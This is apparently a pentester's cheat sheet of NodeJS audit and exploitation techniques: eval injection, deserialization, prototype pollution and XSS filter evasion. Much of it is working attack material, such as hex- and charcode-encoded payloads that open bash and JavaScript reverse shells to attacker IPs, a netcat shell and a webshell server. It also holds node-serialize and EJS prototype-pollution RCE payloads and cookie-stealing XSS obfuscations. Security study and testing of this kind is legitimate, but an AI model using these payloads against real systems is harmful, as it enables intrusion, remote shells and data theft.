    Identified by: bin/www/ and routes/ directories, package.json (project dependencies)
        Start NodeJS server:  ex. cd /bassmaster; nodejs examples/batch.js
    View libraries/dependencies:  npm list
        ex. docker-compose -f ~/chips/docker-compose.yml run chips npm list -prod -depth 1
    File Interaction:  egrep -iR 'fs|readFile|fs\.read|writeFile|appendFile|unlink' .
    SQL:  egrep -iR '\.query' .
        Stacking: grep -iR 'multipleStatements' .
    Dynamic Code Execution:  egrep -R 'eval|setTimeout|setInterval|Function\(' .
        grep -rnw "eval(" . --color
        Injection example:  payload="""abc'+eval(Buffer.from('7265717569726528226368696C645F70726F6365737322292E65786563282762617368202D63202262617368202D69203E26202F6465762F7463702F3139322E3136382E3131392E3134382F3535353520303E2631222729','hex').toString('utf8')))]//;"""
            Same as:  eval(require("child_process").exec('bash -c "bash -i >& /dev/tcp/192.168.119.148/5555 0>&1"')) 
        Try injecting a sub-eval!
        Other Command Injection Payloads:  https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet
            process.cwd()
            Try sub-commands! (eval within eval)
            List directory contents:  res.end(require('fs').readdirSync('.').toString()) ; res.end(require('fs').readdirSync('..').toString())
                var fs=require("fs");fs.readdirSync("/app").toString('utf8')
            Read file:  res.end(require('fs').readFileSync(filename)) ; var fs=require("fs");fs.readFileSync("/app/configs/index.js").toString('utf8')
            Write to File:  require('fs').writeFileSync(filename,data,'base64');
                Execute Binary:  require('child_process').spawn(filename);
            RevShell:  require("child_process").exec('nc <IP Attacker> 4445 -e /bin/sh') -> require("child_process").exec('nc%20<IP Attacker>%204445%20-e%20%2Fbin%2Fsh')                   
                Or:  require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/nc_host/nc_port+0>%261"')
            Start new Server w/ Webshell:  setTimeout(function() { require('http').createServer(function (req, res) { res.writeHead(200, {"Content-Type": "text/plain"});require('child_process').exec(require('url').parse(req.url, true).query['cmd'], function(e,s,st) {res.end(s);}); }).listen(8002); }, 8000)
                Access:  http://127.0.0.1:8002/?cmd=ls ; uname -a ; whoami
            Javascript Reverse Shell:
                var net = require("net"), sh = require("child_process").exec("/bin/bash");var client = new net.Socket();client.connect(53, "attackerip",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
    OS Commands:  egrep -iR 'child_process|exec|execsync|spawn|spawnsync' .  
    LFI:  egrep -R 'require\(|include\(' .
    Deserialization:
        egrep -iR 'node-serialize|serialize-to-js|funcster|cryo' .
        egrep -iR 'unserialize|serial|parse' .
        Payload Generator (choose node-serialize/funcster/cryo library):  node deser-node.js --help
            ex. Node-Serialize:  node deser-node.js -s ns -v rce -c 'touch /tmp/HACKED' [-e charcode\b64] -t linux
        Node-Serialize Payload Examples:  
            {"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n }()"}
            {"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,59, .......))}()"}
        Manual Example (https://0xdf.gitlab.io/2018/08/25/htb-celestial.html):
            python2 nodejsshell.py 192.168.1.1 4444
            Payload Generator (deserialShell.js):
                var y = {
                  rce: function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,51,57,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}
                }
                var serialize = require('node-serialize');
                var s = serialize.serialize(y)
                console.log("Serialized: \n" + s.slice(0,-2) + "()" + s.slice(-2,));
            nodejs deserialShell.js | tail -n +2 | base64 -w0
    Troubleshooting & Useful Commands:
        Testing injection:  ;require('util').log('CODE_EXECUTION');
        Debugging Method:  console.log('Executing: ' + parts[i].value);
            for variables:  console.log(JSON.stringify(variable_name)); 
        *Encoding/Filters:
            https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/
            Hex:
                Automatic Hex Encoding:  ex. cmd = "\\\\x2fbin\\\\x2fbash"  ;  ex. console.log("\x68\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21")
                Function Hex Encoding:  ex. eval(Buffer.from('7265717569726528226368696C645F70726F6365737322292E65786563282762617368202D63202262617368202D69203E26202F6465762F7463702F3139322E3136382E3131392E3134382F3535353520303E2631222729','hex').toString('utf8')) 
                Another Hex option:  String.fromCharCode(88,83,83)
                    Python Method:  
                            payload = '''document.write('<script src="http://10.10.14.30/0xdf.js"></script>');'''
                            ','.join([str(ord(c)) for c in payload])
                        <script>eval(String.fromCharCode(100,111, ...))</script>
            Base64: 
                atob()
                eval(Buffer.from('IENNRCA9IFwidG91Y2ggL3RtcC9IQUNLRURcIjsgcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoQ01ELCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KQ==','base64').toString('utf-8'))
            Hex & Base64 (atob within eval):  self["\x65\x76\x61\x6c"](self["\x61\x74\x6f\x62"]("dmFyIGhlYWQgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnaGVhZCcpLml0ZW0oMCk7dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3NjcmlwdC5zZXRBdHRyaWJ1dGUoJ3R5cGUnLCAndGV4dC9qYXZhc2NyaXB0Jyk7c2NyaXB0LnNldEF0dHJpYnV0ZSgnc3JjJywgJ2h0dHA6Ly9leGFtcGxlLmNvbS9teS5qcycpO2hlYWQuYXBwZW5kQ2hpbGQoc2NyaXB0KTs="))
                XSS filter bypass:  </code> <svg/onload=eval(atob(`%s`))> <code>
                Try eval within an eval!
            **Encoded reverse shell generator:  https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py
                python2 nodejsshell.py 192.168.1.1 4444
            JQuery Methods:
                self["$"]["globalEval"]("alert(1)");	
                self["\x24"]["\x67\x6c\x6f\x62\x61\x6c\x45\x76\x61\x6c"]("\x61\x6c\x65\x72\x74\x28\x31\x29");
                self["$"]["getScript"]("https://example.com/my.js");	
        XSS Filter Evasion:  https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
            More:  https://gist.githubusercontent.com/rvrsh3ll/09a8b933291f9f98e8ec/raw/535cd1a9cefb221dd9de6965e87ca8a9eb5dc320/xxsfilterbypass.lst
            Comment Method:  ex. document/*foo*/./*bar*/cookie	
            Other Examples:
                window["document"]["cookie"]
                window["alert"](window["document"]["cookie"]);	
                self[/*foo*/"alert"](self[document"/*bar*/]["cookie"]);	
                self["ale"+"rt"](self["doc"+"ument"]["coo"+"kie"])
                self["\x61\x6c\x65\x72\x74"](self["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x6f\x6f\x6b\x69\x65"])
    Advanced Sandbox Eval Escape:  https://www.netspi.com/blog/technical/web-application-penetration-testing/escape-nodejs-sandboxes/
    Prototype Pollution: 
        egrep -iR 'merge|extend|\[|parse\(|extend\(|merge\(' .       //look for controllable variables as array keys
        View libraries/dependencies:  docker-compose -f ~/chips/docker-compose.yml run chips npm list -prod -depth 1
        Look for recursive merge/extend features; JSON.parse() - where you control the input data type
        https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
        Background:
            JavaScript vulnerability in which an attacker can inject properties in every object created by an application
                The inherited properties of a class of objects can be changed by referencing the prototype of an object instance
            __proto__ is part of the prototype chain, but prototype is not
            the 'new' keyword sets '__proto__' to the constructor function 'prototype'
            prototype is a property of a Function object - refers to the function itself; It is the prototype of objects constructed by that function.
            __proto__ is an internal property of an object, pointing to its prototype.
            ex. var myPoint = new Point(); -> All True: myPoint.__proto__ == Point.prototype; myPoint.__proto__.__proto__ == Object.prototype
            ex. Student.prototype.isActive() or myStudent.isActive() (aka myStudent.__proto__.isActive()) both work
                When Student.prototype.isActive is modified, so is myStudent.__proto__.isActive
                the isActive function is a link from the __proto__ object to the prototype of Student.
            Modify a class's method from the class (affects all instances):  Student.prototype.toString=...
            Modify a class's method from an instance of the class (affects all instances: myStudent.__proto__.toString=...
        Vulnerability:   if an application accepts user input and allows us to inject into the prototype of Object
            *Often occurs in 'extend' or 'merge' type functions
            *Merge must be recursive (calls itself)
            *Must accept user-provided data (not just run at initialization)
            *Injected property must provide a path to code execution or authentication bypass - check where the properties are used
                ex. isAdmin
            Look for JSON payloads to inject into - try injecting everywhere in the array!   
        Modifying top-level 'Object' pollutes everything, current and future (unless separately defined)!
            {}.__proto__.toString=...
            Object.prototype.toString=...
            abc.__proto__.__proto__.__proto__.toString=...
            Example: after merging {"hello": "world"} and {["__proto__"] :{"bar": "foobar"}} -> {}.bar = 'foobar'
            Variables polluted into the prototype are enumerable (when not using 'length' or 'foreach'):  for (var key in {}) console.log(key) -> bar; for (var i in [1,2]) console.log(i) -> 0,1,bar          
        Discovery: replace a commonly-used function in Object and look for application crash/errors - toString; valueOf
            {}.__proto__.toString = 'blah'
            Look for: "...is not a function...", errors, crash
            Try accessing other pages and look for errors
            Only some properties may be merged - try injecting everywhere!
            Check logs for errors
        Javascript Payloads:
            y = {["__proto__"] :{"toString": "foobar"}}          
            y = {["__proto__"]: { ["__proto__"]: {"toString": "bar" }}}
            y = {"__proto__" :{"toString": "foobar"}}
            y = {["constructor.prototype"] :{"toString": "foobar"}} 
            y = {["constructor.prototype"] :{["constructor.prototype"] :{"toString": "foobar"}} }             
            y = {"constructor.prototype" :{"toString": "foobar"}}            
        JSON Payloads:
            "__proto__":{"toString":"foobar"} 
            "__proto__":{"__proto__":{"toString":"foobar"}}
            "__proto__":{"__proto__":{"__proto__":{"toString":"foobar"}}}
            "constructor.prototype":{"toString":"foobar"}
            "constructor.prototype":{"constructor.prototype":{"toString":"foobar"}}
            "constructor.prototype":{"constructor.prototype":{"constructor.prototype":{"toString":"foobar"}}}
            *Also try valueOf()
            *Inject everywhere possible
            **Inject into the original request
            *Try isAdmin or similar
                ex. "__proto__":{"isAdmin":"true"} 
        Exploitation Methodology:
            Check where the vulnerable libraries are used
            LOOK FOR A PARAMETER THAT'S CHECKED/USED, BUT NOT SET BY DEFAULT - use documentation
                ex. setting isAdmin true in the Object prototype (if it's not explicitly set to False elsewhere)
            RCE:
                find a point in the application where undefined variables are appended to a child_process.exec, eval or vm.runInNewContext function, or similar
                    Look for anything that might eval code/run commands (templating engines, etc.)
                    child_process methods:  https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce
                    egrep -R 'eval|setTimeout|setInterval|' .
                    egrep -iR 'child_process|exec|execsync|spawn|spawnsync' .
                    Check packages:  npm list -prod -depth 0
                        ex. docker-compose -f ~/chips/docker-compose.yml run chips npm list -prod -depth 0
                    *Check templating engine packages and other libraries (node_modules/...)
                        Templating engines compile the template into a JS function - try to inject custom JS
                **LOOK FOR A PARAMETER THAT'S CHECKED, BUT NOT SET BY DEFAULT, AND TRY TO INJECT AND ESCAPE
                    ex. options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;
                    ex. {}.__proto__.preface = "');console.log('RUNNING ANY CODE WE WANT')//"
                Common Templating Engine Exploits:
                    'Eval' may not be obvious - look for render/compile
                    Search backwards, starting from the eval/render/compile
                    EJS Templating engine:
                        TEMPLATING_ENGINE=ejs docker-compose up &
                        Detection (crashes):  "__proto__":{"escape":"foobar"}
                        Start by testing in CLI:  docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
                        RCE Payload:  "__proto__":{"outputFunctionName": "x = 1; console.log(process.mainModule.require('child_process').execSync('whoami').toString()); y"}
                            Shell:  "__proto__":{"outputFunctionName": "x = 1; console.log(process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/192.168.119.169/4444 0>&1\"').toString()); y"}
                    Handlebars Templating Engine:
                        Restart:  docker-compose down; TEMPLATING_ENGINE=hbs docker-compose -f ~/chips/docker-compose.yml up
                        Directory:  node_modules/handlebars/dist/cjs
                            base.js->parser.js->precompile->compiler.js->javascript-compiler.js
                        Interactive CLI:   docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
                        Detection (appends to new page):  "__proto__":{"pendingContent":"abcabcabcabcabc"}
                            XSS:  "__proto__":{"pendingContent":"<script>alert(123)</script>"}
                        RCE Payload:  see HandlebarRCEpayload.txt
                            Pushes content without escaping it
                    Pug Templating Engine:
                        docker-compose down; TEMPLATING_ENGINE=pug docker-compose up &
                        see Hacktricks exploit and https://blog.p6.is/AST-Injection/
                Testing: Use CLI - node
                    ex. docker-compose -f ~/chips/docker-compose.yml exec chips node
                        docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228